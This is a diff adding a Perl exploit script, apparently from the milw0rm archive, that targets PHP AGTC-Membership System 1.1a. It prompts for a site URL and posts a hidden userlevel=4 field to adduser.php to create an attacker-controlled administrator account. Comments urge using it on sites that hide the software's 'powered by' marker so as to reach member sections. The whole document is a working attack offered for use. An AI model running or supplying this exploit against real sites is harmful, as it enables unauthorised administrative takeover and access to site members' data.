@@ -1,0 +1,33 @@
+#!/usr/bin/perl
+
+# Note: adduser.php is accessable to a guest/any-user, but if you access through a browser you cant add admin, theres a hidden POST buried in the script, which contains the userlevel.
+# Note: alot of sites run this script and they remove the "powered by" dork. Also you can get access to alot of nice site's member sections using this, since its a member management script.
+
+use strict;
+use LWP::UserAgent;
+
+print "-+--[ PHP AGTC-Membership System <= 1.1a Arbitrary Add-Admin Exploit ] --+-\n";
+print "-+-- Discovered && Coded By: t0pP8uZz  /  Discovered On: 16 MAY 2008   --+-\n";
+print "-+-- 1.1a tested, not sure if there are new versions, if there are...  --+-\n";
+print "-+-- ... there probarly affected too. Script Download: agtc.co.uk      --+-\n";
+print "-+--          Greetz: h4ck-y0u.org, milw0rm.com, CipherCrew            --+-\n";
+print "-+--[ PHP AGTC-Membership System <= 1.1a Arbitrary Add-Admin Exploit ] --+-\n";
+
+print "\nEnter URL(http://site.com): ";
+	chomp(my $url=<STDIN>);
+
+print "\nAdmin Username(create's your admin username): ";
+	chomp(my $usr=<STDIN>);
+	
+print "\nAdmin Password(create's your admin password): ";
+	chomp(my $pwd=<STDIN>);
+
+my $email = "user".int(rand(9999))."\@localhost.com"; # generates a random email, if a attacker has already exploited this site, this allows the script to add another admin account.
+my $ua    = LWP::UserAgent->new( agent => "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)" );
+my $ob    = $ua->post( $url."/adduser.php", { "username" => $usr, "userpass" => $pwd, "useremail" => $email, "userlevel" => 4, "Submit" => 1} );
+
+if($ob->is_success && index($ob->content, "registered") != -1) {
+	print "Exploit Successfull! Admin Created! Login: $url\n";
+} else { print "Failed. Cause's: username exists or site not vulnerable, try again!"; }
+
+# milw0rm.com [2008-05-18]
